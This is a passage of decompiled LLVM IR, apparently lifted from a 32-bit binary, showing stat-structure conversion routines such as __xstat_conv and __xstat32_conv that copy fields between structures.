  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v1_804ce5d = inttoptr i32 %arg2 to i8*
  %v5_804ce5f = call i8* @_memset(i8* %v1_804ce5d, i32 0, i32 24)
  %v2_804ce61 = load i32, i32* %arg1, align 4
  %v1_804ce63 = add i32 %tmp3, 4
  %v2_804ce63 = inttoptr i32 %v1_804ce63 to i32*
  %v3_804ce63 = load i32, i32* %v2_804ce63, align 4
  store i32 %v3_804ce63, i32* %edx.global-to-local, align 4
  %v1_804ce66 = load i32, i32* %esi.global-to-local, align 4
  %v2_804ce66 = inttoptr i32 %v1_804ce66 to i32*
  store i32 %v2_804ce61, i32* %v2_804ce66, align 4
  %v0_804ce68 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ce68 = load i32, i32* %esi.global-to-local, align 4
  %v2_804ce68 = add i32 %v1_804ce68, 4
  %v3_804ce68 = inttoptr i32 %v2_804ce68 to i32*
  store i32 %v0_804ce68, i32* %v3_804ce68, align 4
  %v0_804ce6b = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ce6b = add i32 %v0_804ce6b, 88
  %v2_804ce6b = inttoptr i32 %v1_804ce6b to i32*
  %v3_804ce6b = load i32, i32* %v2_804ce6b, align 4
  %v1_804ce6e = add i32 %v0_804ce6b, 92
  %v2_804ce6e = inttoptr i32 %v1_804ce6e to i32*
  %v3_804ce6e = load i32, i32* %v2_804ce6e, align 4
  store i32 %v3_804ce6e, i32* %edx.global-to-local, align 4
  %v1_804ce71 = load i32, i32* %esi.global-to-local, align 4
  %v2_804ce71 = add i32 %v1_804ce71, 88
  %v3_804ce71 = inttoptr i32 %v2_804ce71 to i32*
  store i32 %v3_804ce6b, i32* %v3_804ce71, align 4
  %v0_804ce74 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ce74 = load i32, i32* %esi.global-to-local, align 4
  %v2_804ce74 = add i32 %v1_804ce74, 92
  %v3_804ce74 = inttoptr i32 %v2_804ce74 to i32*
  store i32 %v0_804ce74, i32* %v3_804ce74, align 4
  %v0_804ce77 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ce77 = add i32 %v0_804ce77, 12
  %v2_804ce77 = inttoptr i32 %v1_804ce77 to i32*
  %v3_804ce77 = load i32, i32* %v2_804ce77, align 4
  %v1_804ce7a = load i32, i32* %esi.global-to-local, align 4
  %v2_804ce7a = add i32 %v1_804ce7a, 12
  %v3_804ce7a = inttoptr i32 %v2_804ce7a to i32*
  store i32 %v3_804ce77, i32* %v3_804ce7a, align 4
  %v0_804ce7d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ce7d = add i32 %v0_804ce7d, 16
  %v2_804ce7d = inttoptr i32 %v1_804ce7d to i32*
  %v3_804ce7d = load i32, i32* %v2_804ce7d, align 4
  %v1_804ce80 = load i32, i32* %esi.global-to-local, align 4
  %v2_804ce80 = add i32 %v1_804ce80, 16
  %v3_804ce80 = inttoptr i32 %v2_804ce80 to i32*
  store i32 %v3_804ce7d, i32* %v3_804ce80, align 4
  %v0_804ce83 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ce83 = add i32 %v0_804ce83, 20
  %v2_804ce83 = inttoptr i32 %v1_804ce83 to i32*
  %v3_804ce83 = load i32, i32* %v2_804ce83, align 4
  %v1_804ce86 = load i32, i32* %esi.global-to-local, align 4
  %v2_804ce86 = add i32 %v1_804ce86, 20
  %v3_804ce86 = inttoptr i32 %v2_804ce86 to i32*
  store i32 %v3_804ce83, i32* %v3_804ce86, align 4
  %v0_804ce89 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ce89 = add i32 %v0_804ce89, 24
  %v2_804ce89 = inttoptr i32 %v1_804ce89 to i32*
  %v3_804ce89 = load i32, i32* %v2_804ce89, align 4
  %v1_804ce8c = load i32, i32* %esi.global-to-local, align 4
  %v2_804ce8c = add i32 %v1_804ce8c, 24
  %v3_804ce8c = inttoptr i32 %v2_804ce8c to i32*
  store i32 %v3_804ce89, i32* %v3_804ce8c, align 4
  %v0_804ce8f = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ce8f = add i32 %v0_804ce8f, 28
  %v2_804ce8f = inttoptr i32 %v1_804ce8f to i32*
  %v3_804ce8f = load i32, i32* %v2_804ce8f, align 4
  %v1_804ce92 = load i32, i32* %esi.global-to-local, align 4
  %v2_804ce92 = add i32 %v1_804ce92, 28
  %v3_804ce92 = inttoptr i32 %v2_804ce92 to i32*
  store i32 %v3_804ce8f, i32* %v3_804ce92, align 4
  %v0_804ce95 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ce95 = add i32 %v0_804ce95, 32
  %v2_804ce95 = inttoptr i32 %v1_804ce95 to i16*
  %v3_804ce95 = load i16, i16* %v2_804ce95, align 2
  %v4_804ce95 = zext i16 %v3_804ce95 to i32
  %v1_804ce99 = load i32, i32* %esi.global-to-local, align 4
  %v2_804ce99 = add i32 %v1_804ce99, 32
  %v3_804ce99 = inttoptr i32 %v2_804ce99 to i32*
  store i32 %v4_804ce95, i32* %v3_804ce99, align 4
  %v0_804ce9c = load i32, i32* %esi.global-to-local, align 4
  %v1_804ce9c = add i32 %v0_804ce9c, 36
  %v2_804ce9c = inttoptr i32 %v1_804ce9c to i32*
  store i32 0, i32* %v2_804ce9c, align 4
  %v0_804cea3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cea3 = add i32 %v0_804cea3, 44
  %v2_804cea3 = inttoptr i32 %v1_804cea3 to i32*
  %v3_804cea3 = load i32, i32* %v2_804cea3, align 4
  %v1_804cea6 = add i32 %v0_804cea3, 48
  %v2_804cea6 = inttoptr i32 %v1_804cea6 to i32*
  %v3_804cea6 = load i32, i32* %v2_804cea6, align 4
  store i32 %v3_804cea6, i32* %edx.global-to-local, align 4
  %v1_804cea9 = load i32, i32* %esi.global-to-local, align 4
  %v2_804cea9 = add i32 %v1_804cea9, 44
  %v3_804cea9 = inttoptr i32 %v2_804cea9 to i32*
  store i32 %v3_804cea3, i32* %v3_804cea9, align 4
  %v0_804ceac = load i32, i32* %edx.global-to-local, align 4
  %v1_804ceac = load i32, i32* %esi.global-to-local, align 4
  %v2_804ceac = add i32 %v1_804ceac, 48
  %v3_804ceac = inttoptr i32 %v2_804ceac to i32*
  store i32 %v0_804ceac, i32* %v3_804ceac, align 4
  %v0_804ceaf = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ceaf = add i32 %v0_804ceaf, 52
  %v2_804ceaf = inttoptr i32 %v1_804ceaf to i32*
  %v3_804ceaf = load i32, i32* %v2_804ceaf, align 4
  %v1_804ceb2 = load i32, i32* %esi.global-to-local, align 4
  %v2_804ceb2 = add i32 %v1_804ceb2, 52
  %v3_804ceb2 = inttoptr i32 %v2_804ceb2 to i32*
  store i32 %v3_804ceaf, i32* %v3_804ceb2, align 4
  %v0_804ceb5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ceb5 = add i32 %v0_804ceb5, 56
  %v2_804ceb5 = inttoptr i32 %v1_804ceb5 to i32*
  %v3_804ceb5 = load i32, i32* %v2_804ceb5, align 4
  %v1_804ceb8 = load i32, i32* %esi.global-to-local, align 4
  %v2_804ceb8 = add i32 %v1_804ceb8, 56
  %v3_804ceb8 = inttoptr i32 %v2_804ceb8 to i32*
  store i32 %v3_804ceb5, i32* %v3_804ceb8, align 4
  %v0_804cebb = load i32, i32* %esi.global-to-local, align 4
  %v1_804cebb = add i32 %v0_804cebb, 60
  %v2_804cebb = inttoptr i32 %v1_804cebb to i32*
  store i32 0, i32* %v2_804cebb, align 4
  %v0_804cec2 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cec2 = add i32 %v0_804cec2, 64
  %v2_804cec2 = inttoptr i32 %v1_804cec2 to i32*
  %v3_804cec2 = load i32, i32* %v2_804cec2, align 4
  store i32 %v3_804cec2, i32* %edx.global-to-local, align 4
  %v1_804cec5 = add i32 %v0_804cec2, 68
  %v2_804cec5 = inttoptr i32 %v1_804cec5 to i32*
  %v3_804cec5 = load i32, i32* %v2_804cec5, align 4
  %v1_804cec8 = load i32, i32* %esi.global-to-local, align 4
  %v2_804cec8 = add i32 %v1_804cec8, 68
  %v3_804cec8 = inttoptr i32 %v2_804cec8 to i32*
  store i32 %v3_804cec5, i32* %v3_804cec8, align 4
  %v0_804cecb = load i32, i32* %edx.global-to-local, align 4
  %v1_804cecb = load i32, i32* %esi.global-to-local, align 4
  %v2_804cecb = add i32 %v1_804cecb, 64
  %v3_804cecb = inttoptr i32 %v2_804cecb to i32*
  store i32 %v0_804cecb, i32* %v3_804cecb, align 4
  %v0_804cece = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cece = add i32 %v0_804cece, 72
  %v2_804cece = inttoptr i32 %v1_804cece to i32*
  %v3_804cece = load i32, i32* %v2_804cece, align 4
  store i32 %v3_804cece, i32* %edx.global-to-local, align 4
  %v1_804ced1 = add i32 %v0_804cece, 76
  %v2_804ced1 = inttoptr i32 %v1_804ced1 to i32*
  %v3_804ced1 = load i32, i32* %v2_804ced1, align 4
  %v1_804ced4 = load i32, i32* %esi.global-to-local, align 4
  %v2_804ced4 = add i32 %v1_804ced4, 76
  %v3_804ced4 = inttoptr i32 %v2_804ced4 to i32*
  store i32 %v3_804ced1, i32* %v3_804ced4, align 4
  %v0_804ced7 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ced7 = load i32, i32* %esi.global-to-local, align 4
  %v2_804ced7 = add i32 %v1_804ced7, 72
  %v3_804ced7 = inttoptr i32 %v2_804ced7 to i32*
  store i32 %v0_804ced7, i32* %v3_804ced7, align 4
  %v0_804ceda = load i32, i32* %ebx.global-to-local, align 4
  %v1_804ceda = add i32 %v0_804ceda, 80
  %v2_804ceda = inttoptr i32 %v1_804ceda to i32*
  %v3_804ceda = load i32, i32* %v2_804ceda, align 4
  store i32 %v3_804ceda, i32* %edx.global-to-local, align 4
  %v1_804cedd = add i32 %v0_804ceda, 84
  %v2_804cedd = inttoptr i32 %v1_804cedd to i32*
  %v3_804cedd = load i32, i32* %v2_804cedd, align 4
  %v1_804cee0 = load i32, i32* %esi.global-to-local, align 4
  %v2_804cee0 = add i32 %v1_804cee0, 84
  %v3_804cee0 = inttoptr i32 %v2_804cee0 to i32*
  store i32 %v3_804cedd, i32* %v3_804cee0, align 4
  %v0_804cee3 = load i32, i32* %edx.global-to-local, align 4
  %v1_804cee3 = load i32, i32* %esi.global-to-local, align 4
  %v2_804cee3 = add i32 %v1_804cee3, 80
  %v3_804cee3 = inttoptr i32 %v2_804cee3 to i32*
  store i32 %v0_804cee3, i32* %v3_804cee3, align 4
  %v2_804cee6 = load i32, i32* %stack_var_-16, align 4
  ret i32 %v2_804cee6

; uselistorder directives
  uselistorder i32* %esi.global-to-local, { 12, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 4, 5, 12, 6, 7, 8, 9, 10, 11, 13 }
  uselistorder i32 92, { 1, 2, 0 }
}

define i32 @__xstat_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  store i32 %tmp3, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  store i32 22, i32* %ecx.global-to-local, align 4
  %v1_804ceff = inttoptr i32 %arg2 to i8*
  %v5_804cf01 = call i8* @_memset(i8* %v1_804ceff, i32 0, i32 22)
  %v6_804cf01 = ptrtoint i8* %v5_804cf01 to i32
  store i32 %v6_804cf01, i32* %ecx.global-to-local, align 4
  %v0_804cf03 = load i32, i32* %edx.global-to-local, align 4
  %v1_804cf03 = inttoptr i32 %v0_804cf03 to i32*
  %v2_804cf03 = load i32, i32* %v1_804cf03, align 4
  %v1_804cf05 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cf05 = inttoptr i32 %v1_804cf05 to i32*
  store i32 %v2_804cf03, i32* %v2_804cf05, align 4
  %v0_804cf07 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cf07 = add i32 %v0_804cf07, 4
  %v2_804cf07 = inttoptr i32 %v1_804cf07 to i32*
  store i32 0, i32* %v2_804cf07, align 4
  %v0_804cf0e = load i32, i32* %edx.global-to-local, align 4
  %v1_804cf0e = add i32 %v0_804cf0e, 4
  %v2_804cf0e = inttoptr i32 %v1_804cf0e to i32*
  %v3_804cf0e = load i32, i32* %v2_804cf0e, align 4
  %v1_804cf11 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cf11 = add i32 %v1_804cf11, 12
  %v3_804cf11 = inttoptr i32 %v2_804cf11 to i32*
  store i32 %v3_804cf0e, i32* %v3_804cf11, align 4
  %v0_804cf14 = load i32, i32* %edx.global-to-local, align 4
  %v1_804cf14 = add i32 %v0_804cf14, 8
  %v2_804cf14 = inttoptr i32 %v1_804cf14 to i16*
  %v3_804cf14 = load i16, i16* %v2_804cf14, align 2
  %v4_804cf14 = zext i16 %v3_804cf14 to i32
  %v1_804cf18 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cf18 = add i32 %v1_804cf18, 16
  %v3_804cf18 = inttoptr i32 %v2_804cf18 to i32*
  store i32 %v4_804cf14, i32* %v3_804cf18, align 4
  %v0_804cf1b = load i32, i32* %edx.global-to-local, align 4
  %v1_804cf1b = add i32 %v0_804cf1b, 10
  %v2_804cf1b = inttoptr i32 %v1_804cf1b to i16*
  %v3_804cf1b = load i16, i16* %v2_804cf1b, align 2
  %v4_804cf1b = zext i16 %v3_804cf1b to i32
  %v1_804cf1f = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cf1f = add i32 %v1_804cf1f, 20
  %v3_804cf1f = inttoptr i32 %v2_804cf1f to i32*
  store i32 %v4_804cf1b, i32* %v3_804cf1f, align 4
  %v0_804cf22 = load i32, i32* %edx.global-to-local, align 4
  %v1_804cf22 = add i32 %v0_804cf22, 12
  %v2_804cf22 = inttoptr i32 %v1_804cf22 to i16*
  %v3_804cf22 = load i16, i16* %v2_804cf22, align 2
  %v4_804cf22 = zext i16 %v3_804cf22 to i32
  %v1_804cf26 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cf26 = add i32 %v1_804cf26, 24
  %v3_804cf26 = inttoptr i32 %v2_804cf26 to i32*
  store i32 %v4_804cf22, i32* %v3_804cf26, align 4
  %v0_804cf29 = load i32, i32* %edx.global-to-local, align 4
  %v1_804cf29 = add i32 %v0_804cf29, 14
  %v2_804cf29 = inttoptr i32 %v1_804cf29 to i16*
  %v3_804cf29 = load i16, i16* %v2_804cf29, align 2
  %v4_804cf29 = zext i16 %v3_804cf29 to i32
  %v1_804cf2d = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cf2d = add i32 %v1_804cf2d, 28
  %v3_804cf2d = inttoptr i32 %v2_804cf2d to i32*
  store i32 %v4_804cf29, i32* %v3_804cf2d, align 4
  %v0_804cf30 = load i32, i32* %edx.global-to-local, align 4
  %v1_804cf30 = add i32 %v0_804cf30, 16
  %v2_804cf30 = inttoptr i32 %v1_804cf30 to i16*
  %v3_804cf30 = load i16, i16* %v2_804cf30, align 2
  %v4_804cf30 = zext i16 %v3_804cf30 to i32
  %v1_804cf34 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cf34 = add i32 %v1_804cf34, 32
  %v3_804cf34 = inttoptr i32 %v2_804cf34 to i32*
  store i32 %v4_804cf30, i32* %v3_804cf34, align 4
  %v0_804cf37 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cf37 = add i32 %v0_804cf37, 36
  %v2_804cf37 = inttoptr i32 %v1_804cf37 to i32*
  store i32 0, i32* %v2_804cf37, align 4
  %v0_804cf3e = load i32, i32* %edx.global-to-local, align 4
  %v1_804cf3e = add i32 %v0_804cf3e, 20
  %v2_804cf3e = inttoptr i32 %v1_804cf3e to i32*
  %v3_804cf3e = load i32, i32* %v2_804cf3e, align 4
  %v1_804cf41 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cf41 = add i32 %v1_804cf41, 44
  %v3_804cf41 = inttoptr i32 %v2_804cf41 to i32*
  store i32 %v3_804cf3e, i32* %v3_804cf41, align 4
  %v0_804cf44 = load i32, i32* %edx.global-to-local, align 4
  %v1_804cf44 = add i32 %v0_804cf44, 24
  %v2_804cf44 = inttoptr i32 %v1_804cf44 to i32*
  %v3_804cf44 = load i32, i32* %v2_804cf44, align 4
  %v1_804cf47 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cf47 = add i32 %v1_804cf47, 48
  %v3_804cf47 = inttoptr i32 %v2_804cf47 to i32*
  store i32 %v3_804cf44, i32* %v3_804cf47, align 4
  %v0_804cf4a = load i32, i32* %edx.global-to-local, align 4
  %v1_804cf4a = add i32 %v0_804cf4a, 28
  %v2_804cf4a = inttoptr i32 %v1_804cf4a to i32*
  %v3_804cf4a = load i32, i32* %v2_804cf4a, align 4
  %v1_804cf4d = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cf4d = add i32 %v1_804cf4d, 52
  %v3_804cf4d = inttoptr i32 %v2_804cf4d to i32*
  store i32 %v3_804cf4a, i32* %v3_804cf4d, align 4
  %v0_804cf50 = load i32, i32* %edx.global-to-local, align 4
  %v1_804cf50 = add i32 %v0_804cf50, 32
  %v2_804cf50 = inttoptr i32 %v1_804cf50 to i32*
  %v3_804cf50 = load i32, i32* %v2_804cf50, align 4
  store i32 %v3_804cf50, i32* %ecx.global-to-local, align 4
  %v1_804cf53 = add i32 %v0_804cf50, 36
  %v2_804cf53 = inttoptr i32 %v1_804cf53 to i32*
  %v3_804cf53 = load i32, i32* %v2_804cf53, align 4
  %v1_804cf56 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cf56 = add i32 %v1_804cf56, 60
  %v3_804cf56 = inttoptr i32 %v2_804cf56 to i32*
  store i32 %v3_804cf53, i32* %v3_804cf56, align 4
  %v0_804cf59 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804cf59 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cf59 = add i32 %v1_804cf59, 56
  %v3_804cf59 = inttoptr i32 %v2_804cf59 to i32*
  store i32 %v0_804cf59, i32* %v3_804cf59, align 4
  %v0_804cf5c = load i32, i32* %edx.global-to-local, align 4
  %v1_804cf5c = add i32 %v0_804cf5c, 40
  %v2_804cf5c = inttoptr i32 %v1_804cf5c to i32*
  %v3_804cf5c = load i32, i32* %v2_804cf5c, align 4
  store i32 %v3_804cf5c, i32* %ecx.global-to-local, align 4
  %v1_804cf5f = add i32 %v0_804cf5c, 44
  %v2_804cf5f = inttoptr i32 %v1_804cf5f to i32*
  %v3_804cf5f = load i32, i32* %v2_804cf5f, align 4
  %v1_804cf62 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cf62 = add i32 %v1_804cf62, 68
  %v3_804cf62 = inttoptr i32 %v2_804cf62 to i32*
  store i32 %v3_804cf5f, i32* %v3_804cf62, align 4
  %v0_804cf65 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804cf65 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cf65 = add i32 %v1_804cf65, 64
  %v3_804cf65 = inttoptr i32 %v2_804cf65 to i32*
  store i32 %v0_804cf65, i32* %v3_804cf65, align 4
  %v0_804cf68 = load i32, i32* %edx.global-to-local, align 4
  %v1_804cf68 = add i32 %v0_804cf68, 48
  %v2_804cf68 = inttoptr i32 %v1_804cf68 to i32*
  %v3_804cf68 = load i32, i32* %v2_804cf68, align 4
  store i32 %v3_804cf68, i32* @ecx, align 4
  %v1_804cf6b = add i32 %v0_804cf68, 52
  %v2_804cf6b = inttoptr i32 %v1_804cf6b to i32*
  %v3_804cf6b = load i32, i32* %v2_804cf6b, align 4
  %v1_804cf6e = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cf6e = add i32 %v1_804cf6e, 76
  %v3_804cf6e = inttoptr i32 %v2_804cf6e to i32*
  store i32 %v3_804cf6b, i32* %v3_804cf6e, align 4
  %v0_804cf71 = load i32, i32* @ecx, align 4
  %v1_804cf71 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804cf71 = add i32 %v1_804cf71, 72
  %v3_804cf71 = inttoptr i32 %v2_804cf71 to i32*
  store i32 %v0_804cf71, i32* %v3_804cf71, align 4
  %v2_804cf74 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804cf74, i32* %edx.global-to-local, align 4
  ret i32 %v3_804cf6b

; uselistorder directives
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 17, 9, 10, 11, 12, 13, 14, 15, 16, 18 }
  uselistorder i32 14, { 5, 1, 2, 0, 3, 6, 4 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %esi.global-to-local, align 4
  %v1_804cf8d = inttoptr i32 %arg2 to i8*
  %v5_804cf8f = call i8* @_memset(i8* %v1_804cf8d, i32 0, i32 22)
  %v2_804cf91 = load i32, i32* %arg1, align 4
  %v1_804cf93 = add i32 %tmp3, 4
  %v2_804cf93 = inttoptr i32 %v1_804cf93 to i32*
  %v3_804cf93 = load i32, i32* %v2_804cf93, align 4
  store i32 %v3_804cf93, i32* %edx.global-to-local, align 4
  %v1_804cf96 = load i32, i32* %esi.global-to-local, align 4
  %v2_804cf96 = inttoptr i32 %v1_804cf96 to i32*
  store i32 %v2_804cf91, i32* %v2_804cf96, align 4
  %v0_804cf98 = load i32, i32* %edx.global-to-local, align 4
  %v1_804cf98 = load i32, i32* %esi.global-to-local, align 4
  %v2_804cf98 = add i32 %v1_804cf98, 4
  %v3_804cf98 = inttoptr i32 %v2_804cf98 to i32*
  store i32 %v0_804cf98, i32* %v3_804cf98, align 4
  %v0_804cf9b = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cf9b = add i32 %v0_804cf9b, 88
  %v2_804cf9b = inttoptr i32 %v1_804cf9b to i32*
  %v3_804cf9b = load i32, i32* %v2_804cf9b, align 4
  %v1_804cf9e = load i32, i32* %esi.global-to-local, align 4
  %v2_804cf9e = add i32 %v1_804cf9e, 12
  %v3_804cf9e = inttoptr i32 %v2_804cf9e to i32*
  store i32 %v3_804cf9b, i32* %v3_804cf9e, align 4
  %v0_804cfa1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cfa1 = add i32 %v0_804cfa1, 16
  %v2_804cfa1 = inttoptr i32 %v1_804cfa1 to i32*
  %v3_804cfa1 = load i32, i32* %v2_804cfa1, align 4
  %v1_804cfa4 = load i32, i32* %esi.global-to-local, align 4
  %v2_804cfa4 = add i32 %v1_804cfa4, 16
  %v3_804cfa4 = inttoptr i32 %v2_804cfa4 to i32*
  store i32 %v3_804cfa1, i32* %v3_804cfa4, align 4
  %v0_804cfa7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cfa7 = add i32 %v0_804cfa7, 20
  %v2_804cfa7 = inttoptr i32 %v1_804cfa7 to i32*
  %v3_804cfa7 = load i32, i32* %v2_804cfa7, align 4
  %v1_804cfaa = load i32, i32* %esi.global-to-local, align 4
  %v2_804cfaa = add i32 %v1_804cfaa, 20
  %v3_804cfaa = inttoptr i32 %v2_804cfaa to i32*
  store i32 %v3_804cfa7, i32* %v3_804cfaa, align 4
  %v0_804cfad = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cfad = add i32 %v0_804cfad, 24
  %v2_804cfad = inttoptr i32 %v1_804cfad to i32*
  %v3_804cfad = load i32, i32* %v2_804cfad, align 4
  %v1_804cfb0 = load i32, i32* %esi.global-to-local, align 4
  %v2_804cfb0 = add i32 %v1_804cfb0, 24
  %v3_804cfb0 = inttoptr i32 %v2_804cfb0 to i32*
  store i32 %v3_804cfad, i32* %v3_804cfb0, align 4
  %v0_804cfb3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cfb3 = add i32 %v0_804cfb3, 28
  %v2_804cfb3 = inttoptr i32 %v1_804cfb3 to i32*
  %v3_804cfb3 = load i32, i32* %v2_804cfb3, align 4
  %v1_804cfb6 = load i32, i32* %esi.global-to-local, align 4
  %v2_804cfb6 = add i32 %v1_804cfb6, 28
  %v3_804cfb6 = inttoptr i32 %v2_804cfb6 to i32*
  store i32 %v3_804cfb3, i32* %v3_804cfb6, align 4
  %v0_804cfb9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cfb9 = add i32 %v0_804cfb9, 32
  %v2_804cfb9 = inttoptr i32 %v1_804cfb9 to i16*
  %v3_804cfb9 = load i16, i16* %v2_804cfb9, align 2
  %v4_804cfb9 = zext i16 %v3_804cfb9 to i32
  %v1_804cfbd = load i32, i32* %esi.global-to-local, align 4
  %v2_804cfbd = add i32 %v1_804cfbd, 32
  %v3_804cfbd = inttoptr i32 %v2_804cfbd to i32*
  store i32 %v4_804cfb9, i32* %v3_804cfbd, align 4
  %v0_804cfc0 = load i32, i32* %esi.global-to-local, align 4
  %v1_804cfc0 = add i32 %v0_804cfc0, 36
  %v2_804cfc0 = inttoptr i32 %v1_804cfc0 to i32*
  store i32 0, i32* %v2_804cfc0, align 4
  %v0_804cfc7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cfc7 = add i32 %v0_804cfc7, 44
  %v2_804cfc7 = inttoptr i32 %v1_804cfc7 to i32*
  %v3_804cfc7 = load i32, i32* %v2_804cfc7, align 4
  %v1_804cfca = load i32, i32* %esi.global-to-local, align 4
  %v2_804cfca = add i32 %v1_804cfca, 44
  %v3_804cfca = inttoptr i32 %v2_804cfca to i32*
  store i32 %v3_804cfc7, i32* %v3_804cfca, align 4
  %v0_804cfcd = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cfcd = add i32 %v0_804cfcd, 52
  %v2_804cfcd = inttoptr i32 %v1_804cfcd to i32*
  %v3_804cfcd = load i32, i32* %v2_804cfcd, align 4
  %v1_804cfd0 = load i32, i32* %esi.global-to-local, align 4
  %v2_804cfd0 = add i32 %v1_804cfd0, 48
  %v3_804cfd0 = inttoptr i32 %v2_804cfd0 to i32*
  store i32 %v3_804cfcd, i32* %v3_804cfd0, align 4
  %v0_804cfd3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cfd3 = add i32 %v0_804cfd3, 56
  %v2_804cfd3 = inttoptr i32 %v1_804cfd3 to i32*
  %v3_804cfd3 = load i32, i32* %v2_804cfd3, align 4
  %v1_804cfd6 = load i32, i32* %esi.global-to-local, align 4
  %v2_804cfd6 = add i32 %v1_804cfd6, 52
  %v3_804cfd6 = inttoptr i32 %v2_804cfd6 to i32*
  store i32 %v3_804cfd3, i32* %v3_804cfd6, align 4
  %v0_804cfd9 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cfd9 = add i32 %v0_804cfd9, 64
  %v2_804cfd9 = inttoptr i32 %v1_804cfd9 to i32*
  %v3_804cfd9 = load i32, i32* %v2_804cfd9, align 4
  store i32 %v3_804cfd9, i32* %edx.global-to-local, align 4
  %v1_804cfdc = add i32 %v0_804cfd9, 68
  %v2_804cfdc = inttoptr i32 %v1_804cfdc to i32*
  %v3_804cfdc = load i32, i32* %v2_804cfdc, align 4
  %v1_804cfdf = load i32, i32* %esi.global-to-local, align 4
  %v2_804cfdf = add i32 %v1_804cfdf, 60
  %v3_804cfdf = inttoptr i32 %v2_804cfdf to i32*
  store i32 %v3_804cfdc, i32* %v3_804cfdf, align 4
  %v0_804cfe2 = load i32, i32* %edx.global-to-local, align 4
  %v1_804cfe2 = load i32, i32* %esi.global-to-local, align 4
  %v2_804cfe2 = add i32 %v1_804cfe2, 56
  %v3_804cfe2 = inttoptr i32 %v2_804cfe2 to i32*
  store i32 %v0_804cfe2, i32* %v3_804cfe2, align 4
  %v0_804cfe5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cfe5 = add i32 %v0_804cfe5, 72
  %v2_804cfe5 = inttoptr i32 %v1_804cfe5 to i32*
  %v3_804cfe5 = load i32, i32* %v2_804cfe5, align 4
  store i32 %v3_804cfe5, i32* %edx.global-to-local, align 4
  %v1_804cfe8 = add i32 %v0_804cfe5, 76
  %v2_804cfe8 = inttoptr i32 %v1_804cfe8 to i32*
  %v3_804cfe8 = load i32, i32* %v2_804cfe8, align 4
  %v1_804cfeb = load i32, i32* %esi.global-to-local, align 4
  %v2_804cfeb = add i32 %v1_804cfeb, 68
  %v3_804cfeb = inttoptr i32 %v2_804cfeb to i32*
  store i32 %v3_804cfe8, i32* %v3_804cfeb, align 4
  %v0_804cfee = load i32, i32* %edx.global-to-local, align 4
  %v1_804cfee = load i32, i32* %esi.global-to-local, align 4
  %v2_804cfee = add i32 %v1_804cfee, 64
  %v3_804cfee = inttoptr i32 %v2_804cfee to i32*
  store i32 %v0_804cfee, i32* %v3_804cfee, align 4
  %v0_804cff1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804cff1 = add i32 %v0_804cff1, 80
  %v2_804cff1 = inttoptr i32 %v1_804cff1 to i32*
  %v3_804cff1 = load i32, i32* %v2_804cff1, align 4
  store i32 %v3_804cff1, i32* %edx.global-to-local, align 4
  %v1_804cff4 = add i32 %v0_804cff1, 84
  %v2_804cff4 = inttoptr i32 %v1_804cff4 to i32*
  %v3_804cff4 = load i32, i32* %v2_804cff4, align 4
